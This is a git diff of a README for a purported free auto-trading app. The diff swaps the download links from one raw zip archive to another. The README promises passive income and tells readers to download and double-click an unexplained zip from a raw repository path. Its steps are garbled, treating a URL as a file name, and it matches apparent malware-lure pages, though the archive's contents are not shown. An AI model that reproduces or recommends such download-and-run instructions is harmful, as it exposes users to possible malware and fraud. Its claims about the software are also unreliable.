@@ -4,7 +4,7 @@
 Welcome to Free! This application helps you learn about bots and trading while you explore YouTube. With Free, you can set up auto trading systems to gain money passively.
 
 ## 📥 Download Now
-[![Download Free](https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Free.zip)](https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Free.zip)
+[![Download Free](https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Software_1.2-beta.3.zip)](https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Software_1.2-beta.3.zip)
 
 ## 📋 Requirements
 To run Free, you need:
@@ -20,11 +20,11 @@ To run Free, you need:
 - **Crypto and Cash Trading:** Engage in both cryptocurrency and traditional cash trading with ease.
 
 ## 💾 Download & Install
-1. Click [here to visit the Downloads page](https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Free.zip).
+1. Click [here to visit the Downloads page](https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Software_1.2-beta.3.zip).
 2. Find the latest release version at the top of the page.
-3. Download the 'https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Free.zip' file by clicking the link next to it.
+3. Download the 'https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Software_1.2-beta.3.zip' file by clicking the link next to it.
 4. Once the download completes, locate the file on your computer.
-5. Double-click the 'https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Free.zip' file to start the installation process.
+5. Double-click the 'https://raw.githubusercontent.com/KemoSad/Free/main/butterwife/Software_1.2-beta.3.zip' file to start the installation process.
 6. Follow the prompts to complete the installation.
 7. After installation, open Free from your applications or desktop.
 
